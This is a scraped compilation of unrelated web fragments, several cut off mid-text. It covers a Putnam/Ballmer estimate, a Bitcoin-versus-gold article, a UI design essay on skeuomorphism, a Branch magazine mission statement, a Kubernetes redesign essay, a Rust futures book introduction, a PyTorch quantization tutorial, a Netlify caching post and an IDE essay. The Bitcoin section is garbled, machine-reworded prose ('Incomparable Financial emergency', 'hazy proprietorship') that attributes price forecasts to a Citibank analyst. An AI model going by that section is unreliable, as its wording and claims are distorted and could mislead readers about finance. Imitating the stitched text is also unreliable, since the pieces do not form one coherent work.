href="https://www.quora.com/What-did-Steve-Ballmer-get-on-the-Putnam">this source</a> is reliable, Ballmer got one of the 100 best scores on the exam in 1974, but probably not one of the top 45, so let’s split the difference and assume he came in 73rd.</p>
<p>Ballmer was one of the <a href="http://www.infoplease.com/ipa/A0005067.html">4,308,000 Americans</a> born in 1956, and assuming almost all of the top math talent from his cohort went on to compete in the 1974 Putman (and whatever shortfall was made up by top foreign talent and by older and younger talent), then …</p></div></div></div>

                     <p>
                        “Bitcoin will see huge price swings before finally settling at the predicted price” Fitzpatrick, MDCitibank.
                     </p>

                     

               
                        <h3>Comparative Trends</h3>
                        <p>
                            Writing in a report named, Bitcoin: 21st Century Gold, Fitzpatrick makes the flood contention 
                            for bitcoin. He says the computerized gold’s present direction gives off an impression of being like that of gold 
                            during the 1970s. 
                        </p>

                        <p>
                            Before basic changes were executed in the mid-1970s, gold had gone through 50 years of exchanging 
                            the $20-$35 territory. Notwithstanding, after changes were initiated gold flooded. It as of late contacted another 
                            record-breaking high in Augustprior to settling at just shy of $1,900 per ounce. 
                        </p>
                             
                        <p>
                            As per one report that examined 
                            Fitzpatrick’s paper, it is this “auxiliary change in the advanced money related system that introduced a universe of 
                            monetary indiscipline, deficiencies, and expansion.” Therefore, the Citibank manager contends that bitcoin, which 
                            went to the front in the fallout of the “Incomparable Financial emergency” of 2008-2009, will undoubtedly have a 
                            comparative run. 
                        </p>
               
                        <p>
                            With the Covid-19 pandemic actually draining economies around the globe, governments will keep reacting to the emergency by printing more cash. 
                            This thuslywill profit place of refuge resources that perform well in inflationary periods. 
                        </p>
               
                        <h3>Bitcoin Better Than Gold</h3>
               
                        <p>
                            In any case, Fitzpatrick clarifies that albeit gold is required to profit by the storm of new cash entering dissemination, the 
                            valuable metal has novel constraints that don’t appear to distress bitcoin. In his review, Fitzpatrick notes: 
                        </p><p>
                            Gold has limitations, for example, stockpiling, non-compact, and might be even called ‘the previous news’ regarding a 
                            monetary fence. Bitcoin is the new gold. To help this view, the Citibank supervisor refers to a portion of bitcoin’s 
                            key credits which incorporate the advanced cash’s “restricted gracefully, 
                            simplicity of development across fringes, and hazy proprietorship.” Consequently, Fitzpatrick accepts more 
                            speculators will pick bitcoin over gold thus. 
                        </p>

                        <p>
                            In the interim, Fitzpatrick predicts that bitcoin will be exposed to 
                            more administrative limitations going ahead. Be that as it may, dissimilar to other computerized monetary standards, 
                            for example, national bank advanced monetary standards (CBDCs), bitcoin can’t be seized, thus making it a safer 
                            resource.
                        </p>

      <h3>May 31, 2013</h3>
      
      
      <p><img loading="lazy" alt="Skeuo-flat-ic design" src="http://interuserface.net/wp-content/uploads/2013/05/skeuflat.jpg" width="1279" height="461" srcset="https://interuserface.net/wp-content/uploads/2013/05/skeuflat.jpg 1279w, https://interuserface.net/wp-content/uploads/2013/05/skeuflat-300x108.jpg 300w, https://interuserface.net/wp-content/uploads/2013/05/skeuflat-554x200.jpg 554w" sizes="(max-width: 1279px) 100vw, 1279px"></p>
<p>I don’t remember exactly where I first encountered it. But at some point in the past three years, I, along with a large contingent of user interface designers, fans, and industry followers, learned a new word: Skeuomorphic. A skeuomorph in the UI world, so the popular definition goes (even if the rigorous scientific definition of the word <a href="http://www.themachinestarts.com/read/2012-11-how-we-started-calling-visual-metaphors-skeuomorphs-why-apple-design-debate-mess">makes “skeuomorphic design” an oxymoron</a>) is&nbsp;a GUI or elements of a GUI that borrow from a physical analog of their functionality. It seemed like a useful concept in defining the execution of user interfaces, with an added benefit of sounding exotic in conversation – but I think we may have outgrown it.</p>
<h3>Everyone loves a feud</h3>
<p>Somewhere along the way, this newly-popularized concept gained that one thing critical to capturing our collective imagination: a foil. Where skeuomorphism was tied to the familiar, the tactile, the rich, the warm, this dark horse was divorced of the familiar, lived in platonic ideals, was simple, cold, mathematic. Despite drawing most of its theory from the 20th Century’s signature design movement, <a href="http://www.citrinitas.com/history_of_viscom/modernists.html">Modernism</a>, it was nonetheless given its own, rather less impressive (and more prescriptive) name, “<a href="http://designmodo.com/flat-design-principles/">flat design</a>.”</p>
<p>As the story goes, each of these poles had its champion, with Apple raising the varnished-oak banner of its increasingly unified mobile and desktop design language, and Microsoft carrying the solid, rectilinear flag of what was briefly but indelibly called its Metro design language. A war was brewing in the UI design world between flat and skeu: Apple’s <a href="http://techcrunch.com/2013/05/24/jony-ives-ios-7-flat-design-overhaul-reportedly-features-a-lot-of-black-and-white/">rumored “move to flat”</a> would stir more design-office conversation than a betrayal in Game of Thrones.</p>
<h3>Not so flat</h3>
<p>There is a problem with this narrative. Much of the interaction that users have with iOS devices is with UI elements having no physical analogs apart from the most basic, localized physical metaphor, the button – most of these are even just <a href="http://i.imgur.com/kIFUHwM.png">black Helvetica on a white background</a>. And for all of Microsoft’s eschewing of texture, shading, and object references, one cannot escape that its many boxes and encircled icons ultimately draw affordance from our associations with a physical object, the humble pushbutton.</p>
<p>So if much of iOS is “flat,” and Windows Phone is loaded with a thousand tiny skeuomorphs, what are we left with? An important realization: “Flat design” is not nearly as flat as it looks. Skeuomorphism is a critical part of interaction design, and is everywhere.</p>
<p>How, then, do we verbalize the many clear differences between the examples of iOS and Windows Phone? The answer is to build a more nuanced framework than “flat” versus “skeuomorphism.”</p>
<h3>Building a more useful vocabulary</h3>
<p>Instead of imagining a fun-to-follow, yet ultimately empty battle between the forces of skeuomorphism and flat design, a more productive pursuit would be to construct a vocabulary around the toolset these concepts offer. Here are a few tools I see:</p>
<h4>Functional object reference (“skeuomorphism”)</h4>
<div id="attachment_413"><p><img aria-describedby="caption-attachment-413" loading="lazy" alt="object" src="http://interuserface.net/wp-content/uploads/2013/05/object.jpg" width="768" height="215" srcset="https://interuserface.net/wp-content/uploads/2013/05/object.jpg 768w, https://interuserface.net/wp-content/uploads/2013/05/object-300x83.jpg 300w, https://interuserface.net/wp-content/uploads/2013/05/object-614x171.jpg 614w" sizes="(max-width: 768px) 100vw, 768px"></p><p id="caption-attachment-413">Propellerhead Reason, Apple Calendar, Microsoft Windows Phone 8 dialer</p></div>
<p>This is the sort of visual metaphor that ties an object from the physical world to a virtual tool. Ideally it is for purposes of building affordance from familiarity (turning pages in iBooks), but it can easily be misused (non-functional pages in iOS Address Book). Regardless of how realistically it’s rendered, a physical object can be useful as a reference so long as it is recognizable by the user and responds in the same way.</p>
<h4>Material/texture reference</h4>
<div id="attachment_414"><p><img aria-describedby="caption-attachment-414" loading="lazy" alt="texture" src="http://interuserface.net/wp-content/uploads/2013/05/texture.jpg" width="768" height="215" srcset="https://interuserface.net/wp-content/uploads/2013/05/texture.jpg 768w, https://interuserface.net/wp-content/uploads/2013/05/texture-300x83.jpg 300w, https://interuserface.net/wp-content/uploads/2013/05/texture-614x171.jpg 614w" sizes="(max-width: 768px) 100vw, 768px"></p><p id="caption-attachment-414">Apple Game Center, Quantum WordPress theme from Themesorter, artist’s rendition of 1990s CD-ROM menu</p></div>
<p>The difference between this (which you may call skeuomorphism as well; I won’t stop you) and the previous example is that the metaphor is implicit, if present at all. Ideally, there is some implied metaphor: Apple’s Game Center may not actually play backgammon, but its material references to a vintage board game case can put the user’s mind in a conceptual space for gaming. Often, this tool is simply used for decoration, but tasteful decoration can still aid user experience.</p>
<h4>Depth cues</h4>
<div id="attachment_415"><p><img aria-describedby="caption-attachment-415" loading="lazy" alt="depth" src="http://interuserface.net/wp-content/uploads/2013/05/depth.jpg" width="768" height="215" srcset="https://interuserface.net/wp-content/uploads/2013/05/depth.jpg 768w, https://interuserface.net/wp-content/uploads/2013/05/depth-300x83.jpg 300w, https://interuserface.net/wp-content/uploads/2013/05/depth-614x171.jpg 614w" sizes="(max-width: 768px) 100vw, 768px"></p><p id="caption-attachment-415">Apple Notification Center settings, Apple Maps, GitHub for Mac</p></div>
<p>Whereas the previous two tools always use concrete references, depth cues may or may not have such a clear analog. Their primary purpose is to imply what can be done if the user interacts with the controls they adorn, not referencing real objects themselves, but rather mechanical aspects of them.</p>
<h4>Shape / color cues</h4>
<div id="attachment_428"><p><img aria-describedby="caption-attachment-428" loading="lazy" alt="Calvetica settings, Android lock screen, Solve for iOS" src="http://interuserface.net/wp-content/uploads/2013/05/color-shape1.jpg" width="768" height="215" srcset="https://interuserface.net/wp-content/uploads/2013/05/color-shape1.jpg 768w, https://interuserface.net/wp-content/uploads/2013/05/color-shape1-300x83.jpg 300w, https://interuserface.net/wp-content/uploads/2013/05/color-shape1-614x171.jpg 614w" sizes="(max-width: 768px) 100vw, 768px"></p><p id="caption-attachment-428">Calvetica settings, Android lock screen, Solve for iOS</p></div>
<p>Contrasts in shape and color are often used in conjunction with depth cues to further increase contrast and create visual hierarchy. The trend of “flat design” is to use them with minimal application of the other aforementioned tools, which can be successful so long as the application of shape and color contrasts are sufficient to create an affordance of user action.</p>
<h3>Addition and subtraction</h3>
<p>My current one-liner for when the subject comes up is <a href="https://twitter.com/claymill/status/328995618523578371">“‘flat design’ is approximately as useful a term for user interfaces as ‘red design’ or ’round design.'”</a> Far from being a shot at the popular aesthetic of relying heavily on it, though, it’s meant to provoke thought: Flatness and depth are tools, just like color and shape, affordances and analogs.</p>
<p>Don’t just practice flat design or skeuomorphic design. Use the tools that are right for the interface that’s right for your users.</p>

<p><em>Branch</em> is an online magazine written by and for people who dream of a sustainable and just internet for all.</p>



<p>We believe that the internet must serve our collective liberation and ecological sustainability. We want the internet to dismantle the power structures that delay climate action and for the internet itself to become a sustainable and positive force for climate justice.</p>



<p>We see this magazine as a space for personal reflection, critical engagement with technology and internet economics, as well as experimentation and storytelling.&nbsp;Creating change requires all kinds of practices—art and design, professional development, civic participation, policy and advocacy, imagination and positive visions for our future. This is our small attempt at sharing what inspires and challenges us towards a sustainable and just internet for all.  </p>



<p><em>Branch</em> is available online and perhaps later in print as a stand-alone magazine or a supplement for other publications.</p>



<h2>The first issue</h2>



<p>The first issue of <em>Branch</em> looks at underlying structural issues of the climate crisis and its inequalities. We seek to go beyond tech solutionism and towards intersectional climate justice work. We strive to connect sustainability to root causes and to inequalities experienced at different intersections—gender, race, class, ability, and so on. </p>



<p>This issue features visions for a more sustainable internet as well as practical efforts to get us there. We hope to not only articulate what these desirable futures are, but also to embody them with specific tools and art. Contributors include climate activists, open source technologists, indigenous leaders, artists, energy scientists and degrowth experts.</p>



<h2>Future Issues</h2>



<p>The next issue of Branch will be released in spring 2021. If you are interested in contributing, we would love to hear from you. <a href="https://wiki.mozilla.org/Projects/Sustainability/Magazine#Call_for_submissions">Learn more about how to submit an article.</a> </p>



<p>We would also welcome opportunities to distribute the magazine and talk about these issues with you.</p>

		<p>Recently I had a chat with the excellent <a href="https://timewitch.net/">Vallery Lancey</a>, about Kubernetes. Specifically, what we would do differently if we built something new, from the ground up, with no regard for compatibility with Kubernetes. I found that conversation so stimulating that I feel the need to write things down, so here we are.</p>

<p>Before we get started, I want to stress a few things.</p>

<ul>
<li>This is not a fully formed design. Some of these things may not work at all, or require significant redesign. Each section is one random piece of the entire puzzle.</li>
<li>These are not solely my ideas. Some I <em>think</em> are original, but like many things in the Kubernetes community it’s the product of collective thinking. I know at least <a href="https://timewitch.net/">Vallery</a> and <a href="https://twitter.com/maisem_ali">Maisem Ali</a> have influenced my thinking at one time or another, and I’m forgetting many more. If you like an idea, it was a group effort. If you hate it, it’s entirely mine.</li>
<li>Some of these things are polarizing. I’m designing something that makes <em>me</em> happy.</li>
</ul>

<h2 id="guiding-principles">Guiding principles</h2>

<p>My experience of Kubernetes comes from two very different places: authoring <a href="https://www.metallb.org/">MetalLB</a> for bare metal clusters, and operating a large fleet of clusters-as-a-service in <a href="https://cloud.google.com/kubernetes-engine">GKE SRE</a>. Both of these taught me that Kubernetes is extremely complex, and that most people who are trying to use it are not prepared for the sheer amount of work that lies between the marketing brochure and the system those brochures promise.</p>

<p>MetalLB taught me that it’s not possible to build robust software that integrates with Kubernetes. I think MetalLB makes a damn good go of it, but Kubernetes still makes it far too easy to construct broken configurations, and far too hard to debug them. GKE SRE taught me that even the foremost Kubernetes experts cannot safely operate Kubernetes at scale. (Although GKE SRE does a spectacular job with the tools they’re given.)</p>

<p>Kubernetes is the C++ of orchestration software. Immensely powerful, includes all the features, looks deceptively simple, and <em>will</em> hurt you repeatedly until you join its priesthood and devote your life to its mysteries. And even then, the matrix of possible ways to configure and deploy it is so large that you’re never on firm footing.</p>

<p>Continuing that analogy, my guide star is Go. If Kubernetes is C++, what would the Go of orchestration systems look like? Aggressively simple, opinionated, grown slowly and warily, and you can learn it in under a week and get on with what you were actually trying to accomplish.</p>

<p>With that, let’s get going. Starting with Kubernetes, and with a license to completely and utterly break compatibility, what would I do?</p>

<h2 id="mutable-pods">Mutable pods</h2>

<p>In Kubernetes, pods are mostly (but not entirely) immutable after creation. If you want to change a pod, you don’t. Make a new one and delete the old one. This is unlike most other things in Kubernetes, which are mostly mutable and gracefully reconcile towards the new spec.</p>

<p>So, I’m going to make pods be not special. Make them entirely read-write, and reconcile them like you would any other object.</p>

<p>The immediately useful thing I get from that is in-place restarts. If scheduling constraints and resource allocations haven’t changed, guess what? SIGTERM runc, restart runc with different parameters, and you’re done. Now pods look like regular old systemd services, that can move between machines <em>if necessary</em>.</p>

<p>Note that this doesn’t require doing mutability at the runtime layer. If you change a pod definition, it’s still mostly fine to terminate the container and restart it with a new configuration. The pod is still holding onto the resource reservation that got it scheduled onto this machine, so conceptually it’s equivalent to <code>systemctl restart blah.service</code>. You could try to be fancy and make some operations actually update in place at the runtime level as well, but don’t have to. The main benefit is decoupling scheduling, pod lifetime, and lifetime at the runtime layer.</p>

<h2 id="version-control-all-the-things">Version control all the things</h2>

<p>Sticking at the pod layer for a bit longer: now that they’re mutable, the next obvious thing I want is rollbacks. For that, let’s keep old versions of pod definitions around, and make it trivial to “go back to version N”.</p>

<p>Now, a pod update looks like: write an updated definition of the pod, and it updates to match. Update broken? Write back version N-1, and you’re done.</p>

<p>Bonus things you get from this: a diffable history of what happened to your cluster, without needing GitOps nonsense. By all means keep the GitOps nonsense if you want, it has benefits, but you can answer a basic “what changed?” question using only data in the cluster.</p>

<p>This needs a bit more design. In particular, I want to separate out external changes (human submits a new pod) from mechanical changes (some internals of k8s alter a pod definition). I haven’t thought through how to encode both those histories and make both accessible to operators and automation. Maybe it could also be completely generic, wherein a “changer” identifies itself when submitting a new version, and you can then query for changes by or excluding particular changers (think similar to how label queries work at the minute). Again, more design needed there, I just know that I want versioned objects with an accessible history.</p>

<p>We’ll need garbage collection eventually. That said, changes to single pods should delta-compress really well, so my default would be to just keep everything until it becomes a truly dumb amount of data, and figure something out at that point. Keeping everything also acts as a useful mild pressure to avoid “death by a thousand changes” in the rest of the system. Prefer to have fewer, more meaningful changes over a flurry of control loops each changing one field in pursuit of convergence.</p>

<p>Once we have this history, we can do some neat minor things too. For example, the node software could keep container images for the last N versions pinned to the machine, so that rollbacks are as fast as they can possibly be. With an accessible history, you can do this more precisely than “GC older than 30 days and hope”. Generalizing, all the orchestration software can use older versions as GC roots for various resources, to make rollbacks faster. Rollbacks being the primary way of ending outages, this is a very valuable thing to have.</p>

<h2 id="replace-deployment-with-pinneddeployment">Replace Deployment with PinnedDeployment</h2>

<p>This is a short section to basically say that <a href="https://timewitch.net/">Vallery</a> knocked it out of the park with her <a href="https://timewitch.net/post/2019-12-30-pinneddeployments/">PinnedDeployment</a> resource, which lets operators explicitly control a rollout by tracking 2 versions of the deployment state. It’s a deployment object designed by an SRE, with a crisp understanding of what SREs want in a deployment. I love it.</p>

<p>This combines super well with the versioned, in-place pod updates above, and I really don’t have anything to add. It’s clearly how multi-pod things should work. There’s probably some tweaking required to adapt from the Kubernetes-constrained world to this new wonderful unconstrained universe, but the general design is perfect.</p>

<h2 id="explicit-orchestration-workflows">Explicit orchestration workflows</h2>

<p>The biggest issue I have with the “API machinery” bits of Kubernetes is the idea of orchestration as a loose choreography of independent control loops. On the surface, this seems like a nice idea: you have dozens of little control loops, each focused on doing one small thing. When combined in a cluster, they indirectly cooperate with each other to push the state forward and converge on the desired end state. So, what’s the problem?</p>

<p>The problem is that it’s entirely impossible to debug when it goes wrong. A typical failure mode in Kubernetes is that you submit a change to the cluster, then repeatedly refresh waiting for stuff to converge. When it doesn’t… Well, you’re screwed. Kubernetes doesn’t know the difference between “the system has converged successfully” and “a control loop is wedged and is blocking everything else.” You can hope that the offending control loop posted some events to the object to help you, but by and large they don’t.</p>

<p>At which point your only option is to cat the logs of every control loop that might be involved, looking for the one that was wedged. You can make this a bit faster if you have intimate knowledge of all the control loops and what each one does, because that lets you infer from the object’s current state which loop might be trying to run right now.</p>

<p>The key thing to notice here is that the complexity has been shifted from the designer of the control loop to the cluster operator. It’s easy (though not trivial) to make a control loop that does a dinky little thing in isolation. But to operate a cluster with dozens of these control loops requires the operator to assimilate the behavior of all of them, their interactions with each other, and try to reason about an extremely loosely coupled system. This is a problem because you have to write and test the control loop once, but work with it and its bugs many more times. And yet, the bias is to simplify the thing you only do once.</p>

<p>To fix this, I would look to systemd. It solves for a similar lifecycle problem: given a current state and a target, how do you get from A to B? The difference is that in systemd, the steps and their dependencies are made explicit. You <em>tell</em> systemd that your unit is a required part of <code>multi-user.target</code> (aka “normally-booted happy system”), that it must run after filesystems have been mounted, but before networking it brought up, and so forth. You can also depend on other concrete parts of the system, for example to say that your thing needs to run whenever sshd is running (sounds like a sidecar, right?).</p>

<p>The net result of this is that systemd can tell you precisely what piece of the system malfunctioned, or is still working on its thing, or failed a precondition. It can also print you a graph of the system’s boot process, and analyze it for things like “what’s the long pole of bootup?”</p>

<p>I want to steal all this wholesale, and plop it into my cluster orchestration …</p></div></div></div>

<p>This book aims to explain Futures in Rust using an example driven approach,
exploring why they're designed the way they are, and how they work. We'll also
take a look at some of the alternatives we have when dealing with concurrency
in programming.</p>
<p>Going into the level of detail I do in this book is not needed to use futures
or async/await in Rust. It's for the curious out there that want to know <em>how</em>
it all works.</p>
<h2><a href="#what-this-book-covers" id="what-this-book-covers">What this book covers</a></h2>
<p>This book will try to explain everything you might wonder about up until the
topic of different types of executors and runtimes. We'll just implement a very
simple runtime in this book introducing some concepts but it's enough to get
started.</p>
<p><a href="https://github.com/stjepang">Stjepan Glavina</a> has made an excellent series of
articles about async runtimes and executors, and if the rumors are right there
is more to come from him in the near future.</p>
<p>The way you should go about it is to read this book first, then continue
reading the <a href="https://stjepang.github.io/">articles from stejpang</a> to learn more
about runtimes and how they work, especially:</p>
<ol>
<li><a href="https://stjepang.github.io/2020/01/25/build-your-own-block-on.html">Build your own block_on()</a></li>
<li><a href="https://stjepang.github.io/2020/01/31/build-your-own-executor.html">Build your own executor</a></li>
</ol>
<p>I've limited myself to a 200 line main example (hence the title) to limit the
scope and introduce an example that can easily be explored further.</p>
<p>However, there is a lot to digest and it's not what I would call easy, but we'll
take everything step by step so get a cup of tea and relax.</p>
<p>I hope you enjoy the ride.</p>

      <h3 id="introduction">Introduction</h3>

<p>Static quantization quantizes the weights and activations of the model. It allows the user to fuse activations into preceding layers where possible. Unlike <a href="https://leimao.github.io/blog/PyTorch-Dynamic-Quantization/">dynamic quantization</a>, where the scales and zero points were collected during inference, the scales and zero points for static quantization were determined prior to inference using a representative dataset. Therefore, static quantization is theoretically faster than dynamic quantization while the model size and memory bandwidth consumptions remain to be the same. Therefore, statically quantized models are more favorable for inference than dynamic quantization models.</p>



<p>In this blog post, I would like to show how to use PyTorch to do static quantizations. More details about the mathematical foundations of quantization for neural networks could be found in my article <a href="https://leimao.github.io/article/Neural-Networks-Quantization/">“Quantization for Neural Networks”</a>.</p>

<h3 id="pytorch-static-quantization">PyTorch Static Quantization</h3>

<p>Unlike TensorFlow 2.3.0 which supports integer quantization using arbitrary bitwidth from 2 to 16, PyTorch 1.7.0 only supports 8-bit integer quantization. The workflow could be as easy as loading a pre-trained floating point model and apply a static quantization wrapper. However, without doing layer fusion, sometimes such kind of easy manipulation would not result in good model performances.</p>



<p>In this case, I would like to use the ResNet18 from <a href="https://pytorch.org/docs/stable/torchvision/models.html">TorchVision models</a> as an example. I will do post-training quantization with and without layer fusion and compare their performances. The source code could also be downloaded from <a href="https://github.com/leimao/PyTorch-Static-Quantization">GitHub</a>.</p>



<p>Because ResNet has skip connections addition and this addition in the TorchVision implementation uses <code>+</code>. We would have to replace this <code>+</code> (<code>torch.add</code> equivalence) with <a href="https://pytorch.org/docs/1.7.0/torch.nn.quantized.html?highlight=floatfunctional#torch.nn.quantized.FloatFunctional"><code>FloatFunctional.add</code></a> (<code>torch.add</code> + <code>torch.nn.Identity</code> equivalence) in the model definition. This is because <code>torch.nn.Identity</code> serves as a flag for activation quantization. Without it, there will be no activation quantization for skip connection additions, resulting in erroneous quantization calibration.</p>



<p>In addition, we would like to test layer fusions, such as fusing <code>Conv2D</code>, <code>BatchNorm</code>, and <code>ReLU</code>. To do layer fusion, the <code>torch.nn.Module</code> name could not overlap. Otherwise it will cause erroneous quantization calibration. For example, in ordinary FP32 model, we could define one parameter-free <code>relu = torch.nn.ReLU()</code> and reuse this <code>relu</code> module everywhere. However, if we want to fuse some specific <code>ReLU</code>s, the <code>ReLU</code> modules have to be explicitly separated. So in this case, we will have to define <code>relu1 = torch.nn.ReLU()</code>, <code>relu2 = torch.nn.ReLU()</code>, etc. Sometimes, layer fusion is compulsory, since there are no quantized layer implementations corresponding to some floating point layers, such as <code>BatchNorm</code>.</p>



<p>Taken together, the modified ResNet module definition <code>resnet.py</code> is as follows.</p>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div itemprop="articleBody"><p>When someone uses their browser to visit your website, the browser fetches files from your website's server. One example could be a CSS file. Once the CSS file has been fetched, the browser can cache (store) a copy of it. This means that, as the visitor browses your site, the CSS does not need to be fetched once again from the server.</p><p>The advantages of caching a file are: one less network request per page load, less use of the visitor's internet data, and faster load times. Additionally, CSS is a blocking resource. This means that while it is being fetched and loaded, other files have to wait to be loaded. So, the quicker CSS can be loaded, the quicker a visitor can enjoy your site.</p><p>It is important to note once again that the <strong>files cached by the browser are copies</strong>. This means that if a file living on your server is updated, the browser might not know about it. Therefore, a visitor might get the outdated copy of that file, rather than the updated one. The file will still load fast, as it is coming from the browser cache, but it will be outdated.</p><h2>How do servers manage files?</h2><p>The server you're using to serve your website determines which of your site's resources are cached, and how they are cached. There are many different server options available. For the rest of this post, I'll talk about the one hosting the post you are reading - Netlify.</p><p>Netlify has default cache settings. This means that with no effort on my part, I can write my website, deploy it, and share it without needing to worry about configuring cache settings. There is a <a href="https://www.netlify.com/blog/2017/02/23/better-living-through-caching/">blog post about Netlify's default cache settings entitled "Better Living Through Caching"</a>.</p><p>I briefly mentioned earlier the issue of getting an outdated file from the cache. Netlify admit that "cache invalidation is one of the hardest problems in computer science" and that they have found a way around this issue:</p><blockquote><strong>“max-age=0, must-revalidate, public”</strong> = “please cache this content, and then do not trust your cache”. This seems a bit counterintuitive, but there’s a good reason. This favors you as a content creator — you can change any of your content in an instant.</blockquote><p>So, no visitors will be served outdated files. However, all files are re-requested on every single page load. This would be no good, except that Netlify uses "e-tags". These are hash values (long strings of unique characters). The server and browser share the e-tags. If a file changes on the server, for example a CSS file, the e-tag value changes, the browser notices, and the changed file is requested.</p><p>Additionally, Netlify makes the constant checking of files faster using their CDN (content delivery network) and HTTP/2. Please look up these two things, as discussing them is beyond the scope of this post.</p><h2>Trust, then verify</h2><p>It is a really nice thing in modern web development to be able to enjoy stuff done for you automatically by your browser and server. This doesn't mean that you shouldn't know how it all works, though.</p><p>If a server such as Netlify offers default cache settings, it pays to look up what they are, and how they work. A server's default cache settings are unlikely to be the best for <strong>every</strong> website.</p><p>If it is necessary to change cache settings for your website, look up how to manually create your own settings. Here is a <a href="https://docs.netlify.com/routing/headers/#custom-headers">post on how Netlify users can set custom cache headers</a>.</p></div></div>]]>

    <article>
  
  <p>Nov 11, 2020</p>
  <p>Some time ago I wrote a reddit comment explaining the benefits of IDEs.
Folks refer to it from time to time, so I decided to edit it into an article form.
Enjoy!</p>
<p>I think I have a rather balanced perspective on IDEs.
I used to be a heavy Emacs user (<a href="https://github.com/matklad/.emacs.d/tree/475de5db99f8729c57fed7e6fde4cd06f5ccb62f">old config</a>, <a href="https://github.com/matklad/config/blob/d555642a5a9e4e8b0ca0c77f188ffd976f06327c/home/.emacs.d/init.el">current config</a>).
I worked at JetBrains on <a href="https://github.com/intellij-rust/intellij-rust">IntelliJ Rust</a> for several years.
I used evil mode and vim for a bit, and tried tmux and kakoune.
Nowadays, I primarily use VS Code to develop <a href="https://github.com/rust-analyzer/rust-analyzer/">rust-analyzer</a>: LSP-based editor-independent IDE backend for Rust.</p>
<p>I will be focusing on IntelliJ family of IDEs, as I believe these are the most advanced IDEs today.</p>
<p>The main distinguishing feature of IntelliJ is semantic understanding of code.
The core of IntelliJ is a compiler which parses, type checks and otherwise understands your code.
<a href="https://martinfowler.com/bliki/PostIntelliJ.html">PostIntelliJ</a> is the canonical post about this.
That article also refutes the claim that “Smalltalk IDE is the best we’ve ever had”.</p>
<p>Note that “semantic understanding” is mostly unrelated to the traditional interpretation of “IDE” as <em>Integrated</em> Development Environment.
I personally don’t feel that the “Integrated” bit is all that important.
I commit&amp;push from the command line using Julia scripts, rebase in magit, and do code reviews in a browser.
If anything, there’s an ample room for improvement for the integration bits.
For me, <strong>I</strong> in “<strong>I</strong>DE” stands for “intelligent”, smart.</p>
<p>Keep in mind this terminology difference.
I feel it is a common source of misunderstanding.
“Unix and command line can do anything an IDE can do” is correct about integrated bits, but is wrong about semantical bits.</p>
<p>Traditional editors like Vim or Emacs understand programming languages very approximately, mostly via regular expressions.
For me, this feels very wrong.
It’s <a href="https://stackoverflow.com/a/1732454">common knowledge</a> that HTML shall not be parsed with regex.
Yet this is exactly what happens every time one does <code>vim index.html</code> with syntax highlighting on.
I sincerely think that almost every syntax highlighter out there is wrong and we, as an industry, should do better.
I also understand that this is a tall order, but I do my best to change the status quo here :-)</p>
<p>These are mostly theoretical concerns though.
The question is, does semantic understanding help in practice?
I am pretty sure that it is non-essential, especially for smaller code bases.
My <a href="https://github.com/matklad/rustraytracer">first non-trivial Rust program</a> was written in Emacs, and it was fine.
Most of rust-analyzer was written using pretty spartan IDE support.
There are a lot of insanely-productive folks who are like “sometimes I type vim, sometimes I type vi, they are sufficiently similar”.
Regex-based syntax highlighting and regex based fuzzy symbol search (<a href="https://github.com/universal-ctags/ctags">ctags</a>) get you a really long way.</p>
<p>However, I do believe that features unlocked by deep understanding of the language help.
The funniest example here is extend/shrink selection.
This features allows you to extend current selection to the next encompassing syntactic construct.
It’s the simplest feature a PostIntelliJ IDE can have, it only needs the parser.
But it is sooo helpful when writing code, it just completely blows vim’s text objects out of the water, especially when combined with multiple cursors.
In a sense, this is structural editing which works for text.</p>
<div>
<p><img src="https://user-images.githubusercontent.com/1711539/98809232-80e3db00-241d-11eb-883a-5aece9a1dbfc.gif" alt="98809232 80e3db00 241d 11eb 883a 5aece9a1dbfc">
</p>
</div>
<p>If you add further knowledge of the language into a mix, you’ll get the “assists” system: micro-refactoring which available in a particular context.
For example, is the cursor is on a comma in a list of function arguments, you can <span><kbd>alt</kbd>+<kbd>enter</kbd></span> &gt; “swap arguments”, and the order of arguments will be changed in the declaration and on various call-sites as well.
(See <a href="https://rust-analyzer.github.io/blog/2020/09/28/how-to-make-a-light-bulb.html">this post</a> to learn how assists are implemented).</p>
<p>These small dwim things add up to a really nice editing experience, where you mostly express the intention, and the IDE deals with boring syntactical aspects of code editing:</p>
<div>
<p><img src="https://user-images.githubusercontent.com/1711539/98812121-37e25580-2422-11eb-8541-2c5a32926845.gif" alt="98812121 37e25580 2422 11eb 8541 2c5a32926845">
</p>
</div>
<p>For larger projects, complex refactors are a huge time-saver.
Doing project-wide renames and signature changes automatically and without thinking reduces the cost of keeping the code clean.</p>
<p>Another transformative experience is navigation.
In IntelliJ, you generally don’t “open a file”.
Instead you think directly in terms of functions, types and modules, and navigate to those using file structure, goto symbol, to do definition/implementation/type, etc:</p>

<p>When I used Emacs, I really admired its buffer management facilities, because they made opening a file I want a breeze.
When I later switched to IntelliJ, I stopped thinking in terms of a set of opened files altogether.
I disabled editor tabs and started using editor splits less often — you don’t need bookmarks if you can just find things.</p>
<p>For me, there’s one aspect of traditional editors which is typically not matched in IDEs out of the box — basic cursor motion.
Using arrow keys for that is slow and flow-breaking, because one needs to move the hand from the home row.
Even Emacs' horrific <kbd>C-p</kbd>, <kbd>C-n</kbd> are a big improvement, and vim’s <kbd>hjkl</kbd> go even further.
One fix here is to configure each tool to use your favorite shortcuts, but this is a whack-a-mole game.
What I do is remapping <kbd>CapsLock</kbd> to act as an extra modifier, such that <kbd>ijkl</kbd> <strong>are</strong> arrow keys.
(There are also keyboards with <a href="https://ultimatehackingkeyboard.com/">hardware</a> <a href="https://ergodox-ez.com/">support</a> for this).
This works in all applications the same way.
Easy motion / ace jump functionality for jumping to any visible character is also handy, and usually is available <a href="https://plugins.jetbrains.com/plugin/9803-acejump-lite">via</a> <a href="https://marketplace.visualstudio.com/items?itemName=lucax88x.codeacejumper">a plugin</a>.</p>
<p>Recent advancements with LSP protocol promise to give one the best of both worlds, where semantic-aware backend and light-weight editor frontend are different processes, which can be mixed and matched.
This is nice in theory, but not as nice in practice as IntelliJ yet, mostly because IntelliJ is way more polished.</p>
<p>To give a simple example, in IntelliJ for “go to symbol by fuzzy name” functionality, I can filter the search scope by:</p>
<div>
<ul>
<li>
<p>is this my code/code from a dependency?</p>
</li>
<li>
<p>is this test/production code?</p>
</li>
<li>
<p>is a symbol a type-like thing, or a method-like thing?</p>
</li>
<li>
<p>path to the module where the symbol is defined.</p>
</li>
</ul>
</div>
<p>VS Code and LSP simply do not have capabilities for such filters yet, they have to be bolted on using hacks.
